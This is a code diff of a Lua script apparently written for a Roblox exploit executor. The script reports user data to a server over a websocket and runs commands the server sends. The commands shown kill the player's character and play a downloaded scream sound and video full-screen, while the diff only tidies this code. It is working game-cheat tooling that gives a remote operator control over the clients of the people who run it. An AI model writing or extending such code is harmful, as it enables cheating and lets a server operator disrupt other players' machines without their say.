@@ -25,7 +25,7 @@ end
 local commands = {
 	kill = function(args)
 		local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
-		local humanoid = character:WaitForChild("Humanoid")
+		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
 
 		if humanoid and humanoid.Health > 0 then
 			humanoid:TakeDamage(humanoid.MaxHealth)
@@ -41,45 +41,35 @@ local commands = {
 				return sendCmdResponse(false, "Executor not supported")
 			end
 
-			writefile(
-				"scream.mp3",
-				request({
-					Url = "https://github.com/Grayy12/maxhubassets/raw/main/ScreamSfx.mp3",
-					Method = "GET",
-				}).Body
-			)
+			writefile("scream.mp3", request({ Url = "https://github.com/Grayy12/maxhubassets/raw/main/ScreamSfx.mp3", Method = "GET" }).Body)
 
 			writefile("skibidi.webm", request({ Url = "https://github.com/Grayy12/maxhubassets/raw/main/skibidi.webm", Method = "GET" }).Body)
 
-			local Converted = {
+			local items = {
 				["_ScreenGui"] = Instance.new("ScreenGui"),
 				["_VideoFrame"] = Instance.new("VideoFrame"),
 			}
 
-			-- Properties:
+			items["_ScreenGui"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+			items["_ScreenGui"].Parent = (gethui and gethui()) or game:GetService("CoreGui")
 
-			Converted["_ScreenGui"].ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-			Converted["_ScreenGui"].Parent = game:GetService("CoreGui")
+			items["_VideoFrame"].AnchorPoint = Vector2.new(0.5, 0.5)
+			items["_VideoFrame"].Position = UDim2.new(0.5, 0, 0.5, 0)
+			items["_VideoFrame"].Size = UDim2.new(1, 0, 1, 0)
+			items["_VideoFrame"].ZIndex = 9999
+			items["_VideoFrame"].Parent = items["_ScreenGui"]
+			items["_VideoFrame"].Video = getcustomasset("skibidi.webm", true)
 
-			Converted["_VideoFrame"].AnchorPoint = Vector2.new(0.5, 0.5)
-			Converted["_VideoFrame"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-			Converted["_VideoFrame"].BorderColor3 = Color3.fromRGB(0, 0, 0)
-			Converted["_VideoFrame"].BorderSizePixel = 0
-			Converted["_VideoFrame"].Position = UDim2.new(0.5, 0, 0.5, 0)
-			Converted["_VideoFrame"].Size = UDim2.new(1, 0, 1, 0)
-			Converted["_VideoFrame"].ZIndex = 9999
-			Converted["_VideoFrame"].Parent = Converted["_ScreenGui"]
-			Converted["_VideoFrame"].Video = getcustomasset("skibidi.webm", true)
+			local sound = Instance.new("Sound", workspace)
+			sound.SoundId = getcustomasset("scream.mp3", true)
+			sound:Play()
 
-			local s = Instance.new("Sound", workspace)
-			s.SoundId = getcustomasset("scream.mp3", true)
-			s.Volume = 30
-			s:Play()
-			Converted["_VideoFrame"].Looped = false
-			Converted["_VideoFrame"]:Play()
-			Converted["_VideoFrame"].Ended:Wait()
+			items["_VideoFrame"].Looped = false
+			items["_VideoFrame"]:Play()
 
-			Converted["_ScreenGui"]:Destroy()
+			items["_VideoFrame"].Ended:Wait()
+
+			items["_ScreenGui"]:Destroy()
 			delfile("scream.mp3")
 			delfile("skibidi.webm")
 
@@ -90,16 +80,19 @@ local commands = {
 -- Send user data so the server knows who we are
 ws:Send(httpService:JSONEncode(userdata))
 
+-- Listen for messages
 connectionManager:NewConnection(ws.OnMessage, function(msg)
 	local data = httpService:JSONDecode(msg)
 
 	if data.action == "run" then
-		if commands[data.cmd] then
-			pcall(commands[data.cmd], data.args)
+		local cmd = commands[data.cmd]
+		if cmd then
+			pcall(cmd, data.args)
 		end
 	end
 end)
 
+-- Listen for close
 connectionManager:NewConnection(ws.OnClose, function()
 	print("Closed")
 end)
